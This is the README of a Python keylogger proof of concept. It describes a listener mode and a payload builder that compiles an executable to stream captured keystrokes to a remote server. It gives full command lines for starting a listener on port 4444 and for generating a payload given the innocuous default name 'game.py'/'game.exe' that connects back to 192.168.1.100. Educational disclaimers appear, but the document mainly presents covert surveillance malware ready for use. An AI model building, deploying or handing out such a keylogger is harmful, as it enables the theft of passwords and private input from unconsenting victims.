# Reverse Keylogger — Proof of Concept 🕵️‍♂️

> **Warning:** For **educational use only**. Unauthorized or unethical use is illegal. Read the Ethical Use section below. 🚨

---

## Overview 📖

This repository contains a **Proof of Concept (PoC)** keylogger written in **Python**. It demonstrates a reverse keylogger architecture that captures keystrokes on a remote host and forwards them to a central server. The code is provided **strictly for learning and research in controlled environments**.

The application supports two modes:

- **Server Mode (SM)** — listens for client connections and logs keystrokes. 📡
- **Create Payload Mode (CP)** — generates a standalone payload (Python script → executable) that connects back to the server. 💾
- **Log Compiler (LC)** — converts raw keystroke log files into readable, formatted text with special key handling. 🔄

---

## Features 🌟

- **Server Mode (SM)**: Receives keystrokes in real-time from connected clients and optionally saves them to a file. 📝
- **Payload Creation (CP)**: Automatically creates a Python payload and compiles it into an executable using **PyInstaller**. 🛠️
- **Flexible CLI configuration**: Host, port, payload name and output file are configurable via command-line arguments. ⚙️
- **Robust error handling**: Graceful shutdown and resource cleanup. 🛡️
- **Clean build**: Removes temporary build artifacts after creating executables. 🧹

---

## Requirements 🛠️

- **Python 3.8+**

Required Python packages (install with pip):

```
pip install keyboard pyinstaller
```

Built-in / standard libraries used:

- `socket`, `argparse`, `pathlib`, `subprocess`, `shutil`, `os`, `time`

**Supported OS:** Windows and Linux (note: `keyboard` may require root privileges on Linux).

---

## Installation 📦

1. Clone the repository:

```bash
git clone <repository_url>
cd <repository_folder>
```

2. Install requirements (see Requirements section).

3. Install PyInstaller if you plan to build executables:

```bash
pip install pyinstaller
```

---

## Usage 🚀

The application is driven by command-line arguments. Two main modes are available.

### Common Arguments

- `-M`, `--mode`  — Operation mode (`SM` or `CP`). **Required**.
- `-H`, `--host`  — Host to bind (server) or connect to (payload). Default: `0.0.0.0`.
- `-p`, `--port`  — Port number (1–65535). **Required**.
- `-n`, `--name`  — Output filename for generated payload (default: `game.py`).
- `-o`, `--output` — File to save captured keystrokes (server mode only).

### Examples

Run in **Server Mode** (SM):

```bash
python main.py -M SM -H 0.0.0.0 -p 4444 -o keystrokes.log
```

Starts a server listening on port `4444` and logs keystrokes to `keystrokes.log`.

Create a **Payload** (CP):

```bash
python main.py -M CP -H 192.168.1.100 -p 4444 -n game.py
```

Generates a payload (`game.exe` on Windows) that connects to `192.168.1.100:4444` and attempts to deliver keystrokes to the server.

**Notes:**
- In `CP` mode the script writes a Python payload file and runs PyInstaller to compile it; temporary directories such as `build/` and `dist/` are removed automatically after completion.
- In `SM` mode, if `-o` is provided the server will append received keystrokes to the specified output file.

---

## Project Structure 🏗️

- `KeyloggerConfig` — CLI and configuration parsing.
- `PayloadCreator` — Generates and compiles payloads.
- `ServerMode` — Server that accepts connections and logs keystrokes.
- `KeyloggerApp` — Entry point / orchestrator.
- `main.py` — CLI entry script.

(Adjust filenames and module names to match your implementation.)

---

## Ethical Use & Legal Disclaimer ⚠️

- **Educational Purpose Only:** This repository is intended to teach how keyloggers work in a safe, controlled environment (e.g., isolated VMs you own).
- **No Illegal Use:** Deploying or using this software on devices you do not own or without explicit, informed consent is illegal and unethical. The authors and contributors disclaim any responsibility for misuse.
- **Testing Advice:** Always use isolated testbeds (virtual machines, lab networks) when experimenting.

---

## Contributing 🤝

Contributions are welcome but should be focused on education and safety.

1. Fork the repository and create a feature branch: `git checkout -b feature-branch`.
2. Make your changes and test them thoroughly in safe, isolated environments.
3. Open a pull request describing your changes and the educational value.

---

## License 📄

This project is released under the **MIT License**. See `LICENSE` for details.

---

## Support & Contact 🙌

If you have questions or issues, open an issue on the repository or contact the maintainers by email (add an email address in the repo settings).

---

## Pro Tip 🔍

Always test in a virtual machine or sandbox. Keep network interfaces isolated when running reverse connections. Stay safe and ethical. 🔒😎

---


